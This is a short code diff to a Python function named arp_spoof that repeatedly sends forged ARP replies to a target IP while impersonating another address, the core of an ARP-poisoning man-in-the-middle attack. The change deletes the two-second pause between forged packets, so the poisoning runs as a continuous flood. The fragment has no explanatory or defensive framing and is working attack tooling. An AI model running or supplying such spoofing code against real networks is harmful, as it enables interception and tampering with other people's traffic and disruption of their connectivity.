@@ -69,7 +69,6 @@ def arp_spoof(target_ip, spoof_ip):
     try:
         while not stop_thread.is_set():
             send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=False)
-            time.sleep(2)
     except Exception as e:
         print(f"Error during ARP spoofing: {e}")
 
